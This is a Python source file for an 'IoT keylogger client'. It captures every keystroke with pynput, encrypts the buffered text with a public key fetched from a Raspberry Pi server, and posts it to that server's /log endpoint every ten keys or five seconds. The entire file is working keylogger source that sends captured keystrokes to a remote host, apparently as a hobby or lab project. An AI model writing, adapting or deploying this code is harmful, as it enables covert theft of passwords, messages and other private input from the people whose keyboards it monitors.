from pynput import keyboard
import requests
import time
import base64
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
import threading

# Server details - UPDATE THIS
SERVER_IP = "192.168.1.XXX"  # Replace with your Raspberry Pi IP address
SERVER_PORT = 5000
SERVER_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

# Buffer to store keystrokes
keystroke_buffer = []
last_send_time = time.time()
public_key = None
send_lock = threading.Lock()

# Get the public key from server
def get_public_key():
    try:
        print(f"Requesting public key from {SERVER_URL}/public_key")
        response = requests.get(f"{SERVER_URL}/public_key", timeout=5)
        if response.status_code == 200:
            public_key_pem = response.content
            public_key = serialization.load_pem_public_key(public_key_pem)
            print("Successfully retrieved public key")
            return public_key
        else:
            print(f"Error getting public key: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error connecting to server: {e}")
        return None

# Encrypt data with public key
def encrypt_data(data, public_key):
    data_bytes = data.encode('utf-8')
    encrypted_bytes = public_key.encrypt(
        data_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_b64 = base64.b64encode(encrypted_bytes).decode('ascii')
    return encrypted_b64

# Send keystrokes to server
def send_keystrokes():
    global keystroke_buffer, last_send_time, public_key, send_lock
    
    with send_lock:
        if not keystroke_buffer or not public_key:
            return False
        
        try:
            keystrokes_str = ''.join(keystroke_buffer)
            print(f"Sending keystrokes: {keystrokes_str}")
            
            encrypted_data = encrypt_data(keystrokes_str, public_key)
            
            response = requests.post(
                f"{SERVER_URL}/log",
                json={"data": encrypted_data},
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            
            if response.status_code == 200:
                keystroke_buffer = []
                last_send_time = time.time()
                print("Keystrokes sent successfully")
                return True
            else:
                print(f"Error sending data: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error sending data: {e}")
            return False

# Process keypress
def on_press(key):
    global keystroke_buffer, last_send_time
    
    try:
        # Get character representation of the key
        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)
            print(f"Recorded: {key.char}")
        else:
            # Handle special keys
            key_name = str(key).replace('Key.', '[') + ']'
            keystroke_buffer.append(key_name)
            print(f"Recorded special key: {key_name}")
        
        # Send keystrokes in batches or after a time threshold
        current_time = time.time()
        if len(keystroke_buffer) >= 10 or (current_time - last_send_time) > 5:
            # Use a separate thread to avoid blocking the key listener
            threading.Thread(target=send_keystrokes).start()
    
    except Exception as e:
        print(f"Error processing keystroke: {e}")

# Main function
if __name__ == "__main__":
    # Get the public key first
    public_key = get_public_key()
    
    if not public_key:
        print("Failed to get public key from server. Exiting.")
        exit(1)
    
    print("======================================")
    print("     IoT KEYLOGGER CLIENT STARTED     ")
    print("======================================")
    print("Keylogger is now active and running...")
    print("All keystrokes will be sent to the server.")
    print("Press Ctrl+C to stop the keylogger.")
    
    # Start the listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    try:
        # Keep the script running and periodically check for unsent keystrokes
        while True:
            # Check if we should send keystrokes due to timeout
            current_time = time.time()
            if keystroke_buffer and (current_time - last_send_time) > 5:
                threading.Thread(target=send_keystrokes).start()
            time.sleep(1)
    except KeyboardInterrupt:
        # Send any remaining keystrokes before exiting
        if keystroke_buffer:
            send_keystrokes()
        print("Keylogger stopped.")
        listener.stop()
